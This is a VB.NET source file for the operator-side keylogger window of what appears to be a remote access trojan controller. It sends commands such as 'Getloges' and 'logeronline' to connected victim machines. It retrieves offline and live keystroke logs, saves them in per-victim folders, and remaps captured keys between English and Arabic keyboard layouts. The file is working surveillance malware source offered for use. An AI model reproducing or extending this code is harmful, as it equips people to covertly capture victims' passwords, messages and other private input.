Imports System.Text.RegularExpressions
Imports System.IO

Public Class Form31


    Public xxx As Integer
    Sub ColoringSizing(ByVal RTB As RichTextBox, ByVal Word As String, ByVal Size As Integer, ByVal Color As Color)
        On Error Resume Next
        Dim SS As Integer = RTB.SelectionStart
        RTB.SelectAll()
        RTB.SelectionColor = RTB.ForeColor
        RTB.SelectionFont = RTB.Font
        For Each M As Match In Regex.Matches(RTB.Text, "(" & Word & ")", RegexOptions.IgnoreCase)


            RTB.SelectionStart = M.Index
            RTB.SelectionLength = M.Length
            RTB.SelectionColor = Color
            RTB.SelectionFont = New Font(RTB.Font.FontFamily, Size, RTB.Font.Style)

            If Form1.ProgressBar1.Value = 0 Then Form1.ProgressBar1.Value = 100
        Next
        RTB.SelectionStart = SS


    End Sub
 
    Public Sub Getloges(ByVal loges As String)
        On Error Resume Next
        Dim strX As String() = Strings.Split(loges, ChrW(13) & ChrW(10))
        For Each Str As String In strX
            insert(Str)
        Next
        T1.ScrollToCaret()

    End Sub

    Public Sub insert(ByVal T As String)
        On Error Resume Next
        If T.StartsWith("'| ") And T.EndsWith(" |'") Then
            'T1.SelectionFont = New Font(T1.Font, FontStyle.Bold) if you whant
            'T1.Text = T1.Text.Replace("", "")
            'T1.Text = T1.Text.Replace("[]", "")



            'Dim Words As MatchCollection = System.Text.RegularExpressions.Regex.Matches(T1.Text, "(?<=').+")
            'For i = 0 To Words.Count - 1
            '    T1.Select(Words(i).Index, Words(i).Length)
            '    T1.SelectionColor = Color.ForestGreen
            '    T1.SelectionFont = New System.Drawing.Font("Courier New", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))


            'Next

            'T = T.Replace("#| ", "")
            'T = T.Replace(" |#", "")
            T1.AppendText((" " & T & " " & ChrW(13) & ChrW(10)))
        Else
            T1.SelectionColor = System.Drawing.Color.FromArgb(CType(CType(60, Byte), Integer), CType(CType(60, Byte), Integer), CType(CType(60, Byte), Integer))

            T1.AppendText((T & ChrW(13) & ChrW(10)))
        End If

    End Sub


    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click



        If TextBox5.Text = "1" Then


            If T1.Text.Contains(TextBox1.Text) = True Then


                ColoringSizing(T1, TextBox1.Text, "9", Color.Red)


            Else
                TextBox1.Text = ""
            End If
        Else

            If RichTextBox1.Text.Contains(TextBox1.Text) = True Then


                ColoringSizing(RichTextBox1, TextBox1.Text, "9", Color.Red)

            Else
                TextBox1.Text = ""
            End If

        End If














    End Sub
    Private Sub keylogger_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        ContextMenuStrip1.Renderer = New clsVistaToolStripRenderer
        Panel2.Hide()
        Me.Opacity = 0.8R

        TextBox4.Hide()
        TextBox5.Hide()
        If Form1.L1.SelectedItems.Count = 1 Then
            Panel3.Enabled = True

            RichTextBox1.Enabled = True
            TextBox4.Text = Form1.L1.Items.Item(Form1.L1.FocusedItem.Index).SubItems.Item(0).Text
        Else
            RichTextBox1.Enabled = False
            Panel3.Enabled = False

        End If
        TextBox2.Hide()
        TextBox3.Hide()


        Timer2.Enabled = True
        T1.Clear()
        Form1.S.Send(xxx, "Getloges")
        TabPage1.Text = "Offline Keylogger"
        TabPage2.Text = "Online Keylogger"
    End Sub
    Private Sub T1_MouseMove(sender As Object, e As MouseEventArgs) Handles T1.MouseMove
        On Error Resume Next
        TextBox5.Text = 1
    End Sub
    Private Sub T1_TextChanged(sender As Object, e As EventArgs) Handles T1.TextChanged
        On Error Resume Next
        TextBox2.Text = 1
        'Dim Words As MatchCollection = System.Text.RegularExpressions.Regex.Matches(T1.Text, "(?<=').+")
        'For i = 0 To Words.Count - 1
        '    T1.Select(Words(i).Index, Words(i).Length)
        '    T1.SelectionColor = Color.ForestGreen
        '    T1.SelectionFont = New System.Drawing.Font("Courier New", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))

        'Next
        On Error Resume Next
        Dim xtt$ = T1.Text
        ToolStripStatusLabel2.Text = " / The Number Of Characters[ 0 ]".Replace("0", xtt.Length)
        ToolStripStatusLabel1.Text = "Line:[ " & T1.Lines.Length & " ]"
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        TextBox2.Text += 1
        If TextBox2.Text = 5 Then
            TextBox2.Text = 1
            Timer2.Enabled = False

            Me.Opacity = 9.9R
            HuraAlertBox1.Hide()
        End If
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click







        Timer3.Enabled = True

        Button5.Enabled = False
        Button8.Enabled = True
        Dim folderss = (Application.StartupPath & "/bookbinder/" & TextBox4.Text + "\logonline.log")

        If File.Exists(folderss) Then
            My.Computer.FileSystem.WriteAllText(folderss, RichTextBox1.Text, False)
        Else
            My.Computer.FileSystem.WriteAllText(folderss, "", False)
        End If

        Form1.S.Send(xxx, "logeronline")

    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        On Error Resume Next

        Dim folderss = (Application.StartupPath & "/bookbinder/" & TextBox4.Text + "\logonline.log")

        If File.Exists(folderss) Then
            Dim XKL As String
            XKL = System.IO.File.ReadAllText(folderss)
            RichTextBox1.Text = XKL

        End If

    End Sub


    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Form1.S.Send(xxx, "xoxCl")
        RichTextBox1.Text = ""
        Dim Remios = (Application.StartupPath & "/bookbinder/" & (Form1.L1.Items.Item(Form1.L1.FocusedItem.Index).SubItems.Item(0).Text) + "\logonline.log")

        My.Computer.FileSystem.WriteAllText(Remios, "", False)
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Button5.Enabled = True
        Button8.Enabled = False
        Timer3.Enabled = False




        'Label2.Text = 0





        RichTextBox1.Text = RichTextBox1.Text.Replace("Q", "ض")
        RichTextBox1.Text = RichTextBox1.Text.Replace("W", "ص")
        RichTextBox1.Text = RichTextBox1.Text.Replace("E", "ث")
        RichTextBox1.Text = RichTextBox1.Text.Replace("R", "ق")
        RichTextBox1.Text = RichTextBox1.Text.Replace("T", "ف")
        RichTextBox1.Text = RichTextBox1.Text.Replace("Y", "غ")
        RichTextBox1.Text = RichTextBox1.Text.Replace("U", "ع")
        RichTextBox1.Text = RichTextBox1.Text.Replace("I", "ه")
        RichTextBox1.Text = RichTextBox1.Text.Replace("O", "خ")
        RichTextBox1.Text = RichTextBox1.Text.Replace("P", "ح")
        RichTextBox1.Text = RichTextBox1.Text.Replace("[", "ج")
        RichTextBox1.Text = RichTextBox1.Text.Replace("]", "د")
        RichTextBox1.Text = RichTextBox1.Text.Replace("A", "ش")
        RichTextBox1.Text = RichTextBox1.Text.Replace("S", "س")
        RichTextBox1.Text = RichTextBox1.Text.Replace("D", "ي")
        RichTextBox1.Text = RichTextBox1.Text.Replace("F", "ب")
        RichTextBox1.Text = RichTextBox1.Text.Replace("G", "ل")
        RichTextBox1.Text = RichTextBox1.Text.Replace("H", "ا")
        RichTextBox1.Text = RichTextBox1.Text.Replace("J", "ت")
        RichTextBox1.Text = RichTextBox1.Text.Replace("K", "ن")
        RichTextBox1.Text = RichTextBox1.Text.Replace("L", "م")
        RichTextBox1.Text = RichTextBox1.Text.Replace(";", "ك")
        RichTextBox1.Text = RichTextBox1.Text.Replace("'", "ط")
        RichTextBox1.Text = RichTextBox1.Text.Replace("Z", "ئ")
        RichTextBox1.Text = RichTextBox1.Text.Replace("X", "ء")
        RichTextBox1.Text = RichTextBox1.Text.Replace("C", "ؤ")
        RichTextBox1.Text = RichTextBox1.Text.Replace("V", "ر")
        RichTextBox1.Text = RichTextBox1.Text.Replace("B", "لا")
        RichTextBox1.Text = RichTextBox1.Text.Replace("N", "ى")
        RichTextBox1.Text = RichTextBox1.Text.Replace("M", "ة")
        RichTextBox1.Text = RichTextBox1.Text.Replace(",", "و")
        RichTextBox1.Text = RichTextBox1.Text.Replace(".", "ز")
        RichTextBox1.Text = RichTextBox1.Text.Replace("/", "ظ")





    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Form1.S.Send(xxx, "stopg")
        Button5.Enabled = True
        Button8.Enabled = False
        Timer3.Enabled = False
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Button5.Enabled = True
        Button8.Enabled = False
        Timer3.Enabled = False
        'Label2.Text = 1

        RichTextBox1.Text = RichTextBox1.Text.Replace("ض", "Q")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ص", "W")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ث", "E")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ق", "R")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ف", "T")
        RichTextBox1.Text = RichTextBox1.Text.Replace("غ", "Y")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ع", "U")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ه", "I")
        RichTextBox1.Text = RichTextBox1.Text.Replace("خ", "O")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ح", "p")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ج", "[")
        RichTextBox1.Text = RichTextBox1.Text.Replace("د", "]")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ش", "A")
        RichTextBox1.Text = RichTextBox1.Text.Replace("س", "S")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ي", "D")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ب", "F")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ل", "G")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ا", "H")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ت", "J")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ن", "K")
        RichTextBox1.Text = RichTextBox1.Text.Replace("م", "L")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ك", ";")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ط", "'")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ئ", "Z")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ء", "X")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ؤ", "C")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ر", "V")
        RichTextBox1.Text = RichTextBox1.Text.Replace("لا", "B")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ى", "N")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ة", "M")
        RichTextBox1.Text = RichTextBox1.Text.Replace("و", ",")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ز", ".")
        RichTextBox1.Text = RichTextBox1.Text.Replace("ظ", "/")
    End Sub




    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        If TextBox5.Text = "2" Then
            If Button5.Enabled = False Then
                Button3.Enabled = False
                ContextMenuStrip1.Enabled = False

            Else
                Button3.Enabled = True
                ContextMenuStrip1.Enabled = True
            End If
        End If




        'If TextBox5.Text = "2" Then
        '    If Button5.Enabled = False Then


        '    Else
        '        Button3.Enabled = True
        '    End If
        'End If

    End Sub



    Private Sub RichTextBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles RichTextBox1.MouseMove
        On Error Resume Next
        TextBox5.Text = 2
    End Sub

    Private Sub SeveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SeveToolStripMenuItem.Click
        If TextBox5.Text = 1 Then
            Dim x As New SaveFileDialog With {.Filter = "(*.rtf)|*.rtf"}
            If x.ShowDialog = Windows.Forms.DialogResult.OK Then
                T1.SaveFile(x.FileName)
            End If
        End If
        If TextBox5.Text = 2 Then

            Dim x As New SaveFileDialog With {.Filter = "(*.rtf)|*.rtf"}
            If x.ShowDialog = Windows.Forms.DialogResult.OK Then
                RichTextBox1.SaveFile(x.FileName)
            End If
        End If

    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        If TextBox5.Text = 1 Then


            T1.Copy()

        End If
        If TextBox5.Text = 2 Then

            RichTextBox1.Copy()
        End If

    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If TextBox5.Text = 1 Then


            Me.Opacity = 0.8R

            HuraAlertBox1.Show()
            Timer2.Enabled = True
            T1.Clear()
            Form1.S.Send(xxx, "Getloges")

        End If

    End Sub

    Private Sub CleaningToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CleaningToolStripMenuItem.Click
        If TextBox5.Text = 1 Then
            T1.Text = ""


        End If
        If TextBox5.Text = 2 Then
            RichTextBox1.Text = ""


        End If




    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub
End Class